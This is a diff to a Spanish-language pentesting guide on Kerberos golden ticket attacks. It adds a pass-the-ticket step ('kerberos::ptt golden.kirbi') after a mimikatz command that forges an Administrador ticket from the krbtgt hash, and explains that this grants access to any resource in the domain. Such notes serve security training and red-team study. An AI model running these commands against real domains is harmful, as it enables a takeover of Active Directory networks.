@@ -49,6 +49,13 @@ Para esto vamos a crear un archivo golden.kirbi, luego, este lo vamos a injectar
 kerberos::golden /domain:\[Dominio] /sid:\[SID del usuario krbtgt] /rc4:\[Hash NT] /user:Administrador /ticket:golden.kirbi
 ```
 
+Ahora tenemos que mover este golden.kirbi a la maquina desde la cual queramos tener privilegios elevados, o lo que conoceremos como PTT (Pass-The-Ticket)
+
+```python
+kerberos::ptt golden.kirbi
+```
+
+Esto simplemente inyectará el ticket seleccionado en la memoria, haciendo que sea utilizado para establecer conexiones kerberos, al hacer un golden ticket, podemos acceder a cualquier recurso, ya que es como si fuéramos el administrador
 ## Acceder a cualquier maquina desde nuestra maquina atacante (Segunda opción)
 
 Para esto vamos a crear un archivo Administrador.ccache el cual se va a enviar para autenticarse a las maquinas como el usuario Administrador:
